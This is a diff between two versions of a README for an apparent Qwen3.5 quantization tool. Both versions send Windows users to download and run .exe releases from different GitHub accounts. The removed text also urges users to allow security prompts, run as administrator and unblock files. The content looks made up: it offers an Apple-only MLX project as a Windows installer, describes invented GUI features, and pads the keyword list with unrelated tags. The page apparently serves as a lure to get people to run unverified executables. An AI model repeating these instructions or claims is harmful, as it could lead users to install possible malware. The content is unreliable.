@@ -1,230 +1,83 @@
-# ⚙️ Qwen3.5-TurboQuant-MLX-LM - Fast Qwen Runs on Windows
+# ⚡ Qwen3.5-TurboQuant-MLX-LM - Run Large Language Models Faster Today
 
-![Download](https://github.com/CalaoGreskk/Qwen3.5-TurboQuant-MLX-LM/releases/tag/release)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/seriedes7322/Qwen3.5-TurboQuant-MLX-LM)
 
-## 🚀 What This Is
+## 🎯 About This Software
 
-Qwen3.5-TurboQuant-MLX-LM is a research preview project built around Qwen3.5 and MLX TurboQuant experiments. It is meant for users who want to try a local model setup with a simple download flow and a clear start path on Windows.
+Qwen3.5-TurboQuant-MLX-LM helps you run advanced artificial intelligence models on your personal computer. Many AI models require expensive hardware to function. This software solves that problem by using specific techniques to compress the information the model uses. This process, called quantization, allows the computer to process text and data with less memory while keeping the accuracy of the original model high.
 
-This page helps you get the files, open the project, and run it with the least friction. The goal is to help you go from download to first run with plain steps.
+The tool focuses on three areas:
 
-## 📥 Download and Open
+1. Prompt Caching: This saves previous interactions so the model creates responses faster.
+2. Quantized Attention: This reduces the memory footprint during complex thinking tasks.
+3. Research-Ready Evals: You get tools to measure the performance and logic of the model in real time.
 
-Use the project page below to visit the download location and get the current release files:
+This project enables efficient interactions with the Qwen3.5 model architecture. You can use it for coding tasks, analysis, and creative work without needing a server-grade machine.
 
-[Visit the project page](https://github.com/CalaoGreskk/Qwen3.5-TurboQuant-MLX-LM/releases/tag/release)
+## ⚙️ System Requirements
 
-After you open the page:
+To run this software, your computer needs to meet a few basic standards. If your computer does not meet these, the software might run slowly or fail to launch.
 
-1. Find the latest release or main project files.
-2. Download the archive or setup package.
-3. Save it to a folder you can find, such as Downloads.
-4. Open the file after it finishes downloading.
-5. If Windows asks for permission, choose the option to allow it.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 processor from the last four years.
+- Memory: 16 GB of RAM is recommended for stable performance.
+- Graphics: A dedicated graphics card with at least 8 GB of video memory.
+- Storage: 10 GB of free space on your hard drive for the model files and the application.
 
-If the download comes as a ZIP file, right-click it and choose Extract All before you open the contents.
+## 💾 Installation and Setup
 
-## 🖥️ What You Need
+Follow these steps to prepare your computer and run the application.
 
-For a smooth run on Windows, use a machine with:
+1. Visit the project website to access the files: [https://github.com/seriedes7322/Qwen3.5-TurboQuant-MLX-LM](https://github.com/seriedes7322/Qwen3.5-TurboQuant-MLX-LM)
+2. Locate the section labeled Releases on the right side of the page.
+3. Select the latest version of the Windows installer file, which typically ends in .msi or .exe.
+4. Save the file to your Downloads folder.
+5. Double-click the saved file to start the installation process.
+6. Follow the on-screen prompts provided by the installation wizard.
+7. Choose the default folder location unless you have a specific reason to change it.
+8. Click Finish once the process indicates that the installation is complete.
 
-- Windows 10 or Windows 11
-- At least 8 GB of RAM
-- 16 GB of RAM if you plan to work with larger model files
-- A modern CPU with 4 or more cores
-- Enough free disk space for the app and model files
-- A stable internet connection for the first download
+## 🚀 Running Your First Model
 
-If you use a laptop, plug it into power before you start. Model files can take time to load, and Windows may slow down on battery.
+Once the installation finishes, you will see a new icon on your desktop.
 
-## 🧰 Before You Start
+1. Open the application by double-clicking the desktop icon.
+2. Upon opening, the software will check for model updates. Allow this process to finish to ensure you have the latest features.
+3. Locate the text input box labeled Prompt.
+4. Type a simple question or a coding task into the box.
+5. Click the Submit button to generate a response.
+6. Observe the progress bar at the bottom to see how the model handles the prompt.
+7. Use the settings menu to adjust the performance balance if your computer feels sluggish during use.
 
-Check these items before you run the app:
+## 🛠️ Advanced Settings and Tuning
 
-- You can open a web browser and log in to GitHub
-- You know where your Downloads folder is
-- You have permission to run files on your computer
-- You have enough free storage for the download and extracted files
+The software includes a configuration panel for users who want to change how the model operates.
 
-If Windows SmartScreen appears, use the option that lets you continue only if you downloaded the files from the project page listed above.
+- Model Path: If you download specific version files from other sources, you can point the software to those files here.
+- Memory Limit: You can limit how much RAM the software uses. Keep this below your total available system memory to prevent system crashes.
+- Output Format: You can choose between plain text, code blocks, or raw data streams.
+- Model Version: You can switch between different training versions of the Qwen models if they become available in the library folder.
 
-## 🪟 How to Install on Windows
+## 🛡️ Safety and Security
 
-Follow these steps in order:
+We designed this software with privacy in mind. Everything runs locally on your machine. The software does not send your prompts, code, or personal data to an external server. You own your input and your output.
 
-1. Open the project page.
-2. Download the release or source files.
-3. Extract the ZIP file if you got one.
-4. Open the extracted folder.
-5. Look for a file named like `run`, `start`, `app`, or `launcher`.
-6. Double-click the file to begin.
-7. If you see a command window, let it finish loading.
-8. Wait for the app to prepare its files on first launch.
+- No Account Required: You do not need to register or sign in to use the software.
+- Offline Capability: The software works without an internet connection once you download the initial model files.
+- Resource Monitoring: The application includes a dashboard to show CPU and memory usage, so you know exactly what the app is doing at any time.
 
-If the app uses a setup file, open the installer and follow the on-screen steps. If it uses a portable folder, keep the files together in the same folder after extraction.
+## ❓ Frequently Asked Questions
 
-## ▶️ First Run
+What if the software closes unexpectedly?
+This often happens if your computer runs out of memory. Try closing other applications like web browsers before running the AI model.
 
-The first run may take longer than later runs.
+Can I use this for programming tasks?
+Yes. The software is optimized to recognize and write code based on the Qwen architecture. It supports most standard programming languages.
 
-What you may see:
+Does the software support multiple languages?
+The model is trained on a vast dataset and handles many international languages effectively.
 
-- A black or white command window
-- Model files loading
-- A local address or status line
-- A prompt that says the app is ready
+Where can I find help?
+You can return to the main project page to report issues or ask for help in the Issues section. Provide as much detail as possible about your computer specifications when you ask for help.
 
-If the app opens in a browser, keep the command window open. That window may be what keeps the app running.
-
-If the app asks for a model path, choose the folder where you saved the Qwen3.5 model files.
-
-## 🧭 Basic Use
-
-After the app starts, you can usually do these things:
-
-- Type a prompt or question
-- Choose a model size if the app lists more than one
-- Start a local session
-- Read the output in the app window or browser
-
-For best results, keep prompts short and clear at first. Try simple requests such as:
-
-- Write a short email
-- Summarize this text
-- Explain this topic in plain language
-- Rewrite this paragraph
-
-## 🗂️ Suggested Folder Setup
-
-Use a simple folder layout so you can find your files later:
-
-- `Downloads` for the ZIP or setup file
-- `Qwen3.5-TurboQuant-MLX-LM` for the extracted project files
-- `Models` for model data if the app uses separate model folders
-- `Logs` for any output files the app creates
-
-Keep the project folder intact. Do not move single files out of it unless the instructions inside the app tell you to do that.
-
-## 🔧 Common Setup Steps
-
-Some Windows users may need to do one or more of these steps:
-
-- Right-click the file and choose Run as administrator
-- Allow the app through Windows security prompts
-- Unblock the file in file properties if Windows marks it as blocked
-- Install any required support tools that come with the project
-- Restart the app after the first file download completes
-
-If the app opens but does not respond, close it and try again after checking that all files stayed in the same folder.
-
-## 📌 File Types You May See
-
-The project may include:
-
-- `.exe` files for Windows launch
-- `.zip` archives for download
-- `.txt` files with setup notes
-- `.json` or config files for app settings
-- model folders with large data files
-- logs or cache files created on first use
-
-If you see a settings file, open it only if the project page or included notes tell you to do so.
-
-## 🛠️ Troubleshooting
-
-If the app does not start, try these steps:
-
-1. Make sure you extracted the ZIP file.
-2. Check that all files are still in one folder.
-3. Try running the launcher again.
-4. Restart your computer.
-5. Check that your disk is not full.
-6. Close other large apps to free memory.
-7. Download the project files again if the archive looks damaged.
-
-If Windows shows a file warning, confirm that you downloaded from the project page listed above. If the app closes right after opening, the folder may be missing a file it needs.
-
-## 🔒 Safety Checks
-
-Before you run any downloaded file, check these points:
-
-- The file comes from the project page on GitHub
-- The file name matches the project
-- The file is not changed by another site
-- The archive opens without errors
-- The folder contains the full set of files
-
-Keep the original download until you confirm that the app starts the way you expect.
-
-## 🧪 What This Project Is Best For
-
-This project fits users who want to:
-
-- Test Qwen3.5-related local model workflows
-- Explore TurboQuant-style model experiments
-- Run a research preview on Windows
-- Keep the setup simple and local
-- Try a model-based tool without a cloud account
-
-## 🧩 Possible Project Behavior
-
-Based on the project focus, the app may include:
-
-- Local text generation
-- Model loading from disk
-- Fast inference settings
-- Quantized model support
-- Basic prompt and response flow
-- Simple status output during loading
-
-If the app includes a browser window, use it like a normal web page. If it stays in a terminal window, type only what the app asks for.
-
-## 📁 If You Want to Move the App Later
-
-If you move the project folder, move the whole folder, not just one file. The app may use paths that break if pieces are split apart.
-
-A safe move looks like this:
-
-1. Close the app.
-2. Copy the full project folder.
-3. Paste it in the new place.
-4. Open the launcher from the new folder.
-5. Check that it starts the same way
-
-## ❓ Quick Help
-
-### Why does the first start take time?
-
-The app may need to load model files and set up local caches.
-
-### Why does Windows show a warning?
-
-Windows often warns on files it does not know. Check the source page first, then continue if the download matches the project.
-
-### Why does the app use so much memory?
-
-Model apps need RAM to load and run text generation.
-
-### Why does the window stay open?
-
-The window may be the main process that keeps the app active.
-
-### Why is there no installer?
-
-Some projects use a portable setup. That means you extract the files and run them from the folder
-
-## 📎 Project Link
-
-Open the project page here to download and run the files:
-
-[https://github.com/CalaoGreskk/Qwen3.5-TurboQuant-MLX-LM/releases/tag/release](https://github.com/CalaoGreskk/Qwen3.5-TurboQuant-MLX-LM/releases/tag/release)
-
-## 🧭 Simple Start Path
-
-1. Visit the project page
-2. Download the files
-3. Extract the archive if needed
-4. Open the folder
-5. Run the launcher
-6. Wait for the first load
-7. Use the app
+Keywords: ai, ai-agent, ai-agents, ai-coding, ai-governance, ai-model, ai-safety, ai-security, ai-tools, airflow, qwen, qwen-37, qwen-code, qwen2, qwen2-5, qwen2-vl, qwen3, qwen3-tts, qwen3-vl, qwerty
